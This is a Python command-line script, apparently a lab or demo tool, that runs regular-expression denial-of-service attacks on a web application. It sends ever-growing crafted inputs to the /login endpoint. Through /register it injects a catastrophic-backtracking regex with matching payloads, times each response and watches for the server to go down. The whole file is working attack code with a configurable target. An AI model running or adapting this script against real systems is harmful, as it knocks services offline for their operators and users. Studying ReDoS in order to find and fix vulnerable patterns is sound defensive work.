import time
import typer
from requests import ConnectTimeout, HTTPError, ReadTimeout, Session, Timeout
from rich.markup import escape
from rich.console import Console
from urllib3.exceptions import NewConnectionError,ConnectionError


app = typer.Typer()
session = Session()
console = Console(record=True)


def attack(type_attack,server,username,password,input,timeout_in_seconds):

    if type_attack != 1 and type_attack != 2:
        exit(0)

    response = None

    if type_attack == 1:
        mode = "login"
        input = username
    elif type_attack == 2:
        mode = "register"
        if input == "":
            input = password
        else:
            password = input
    else:
        exit(0)

    console.rule(f"[bold]{mode} function")
    console.print(f"\n{mode} with this [bold] username: {escape(username)},[bold] password: [bold green] {password}, [bold red] input size: {len(input)}")

    try:

        response = session.post(f"{server}/{mode}", data={
            "username": username,
            "password": password
        },timeout=timeout_in_seconds)
        time_required = response.elapsed.total_seconds()
        if response.status_code != 200:
            console.log("SERVER ERROR: ",response.status_code)
            exit(0)
        console.print(f"\nTime required:------------> [bold black] {time_required} seconds",style="bold italic black on green")

    except (ConnectTimeout, HTTPError, ReadTimeout, Timeout, ConnectionError):
        console.print(f"\nSERVER PROBABLY DOWN, NOT RESPONDING IN {timeout_in_seconds} seconds.", style="blink bold white on red")
        exit(0)
    except (NewConnectionError,ConnectionError):
        console.print(f"\nSERVER PROBABLY REFUSED CONNECTION.", style="blink bold white on red")
        exit(0)

    return response


@app.callback()
def main(
        type_attack: int = typer.Option(
            default = 1,
            prompt = True,
            help = "Mode 1 to login, Mode 2 to register"
        ),
        server: str = typer.Option(
            default = "http://127.0.0.1:3200",
            prompt = True,
            help = "Server to attack"
        ),
        timeout_in_seconds: int = typer.Option(
            prompt = True,
            default = 60,
            help = "Timeout for requests"

        ),
        max_input_size: int = typer.Option(
            prompt = True,
            default = 100,
            help = "Size of input to ReDos server in login mode"
        ),
        evil_regex: str = typer.Option(
            prompt = True,
            default = "^(([a-z])+.)+[A-Z]([a-z])+$",
            help = "[ONLY FOR MODE 2] Insert an evil regex to use in register mode."
        ),
        base_input: str = typer.Option(
            prompt = True,
            default = "a",
            help = "[ONLY FOR MODE 2] Insert the base input necessary to concatenate with bad input to exploit regex in mode 2."
        ),
        bad_input: str = typer.Option(
            prompt = True,
            default = "!",
            help = "[ONLY FOR MODE 2] Insert the bad_input that will create backtracking to exploit regex in mode 2."
        ),

):
    console.print("\n")
    server = server.strip()
    evil_regex = evil_regex.strip()
    patter_to_replicate = base_input
    i = 1
    with console.status("Loading..."):
        while(i < max_input_size):
            # console.clear()
            base_input = base_input + patter_to_replicate
            input = base_input + bad_input
            if type_attack == 1:
                attack(type_attack=type_attack,server=server,username=input,password="1234",input=input,timeout_in_seconds=timeout_in_seconds)
            elif type_attack == 2:
                attack(type_attack=type_attack,server=server,username=evil_regex,password=input,input=input,timeout_in_seconds=timeout_in_seconds)
            else:
                console.log("mode not allowed.")
                exit(0)
            i +=1
            time.sleep(1)


if __name__ == "__main__":
    typer.run(main)


####### 2 Mode:
# 1. function Loging server with simple ReDos, try an input ever bigger to make the server unavailable
## 1.1 print time_response minor at the timeout and check server availability after 
# 2. function Register, server with regex injection, try an evil regex and a crafted input
## 2.2 check server availability after 

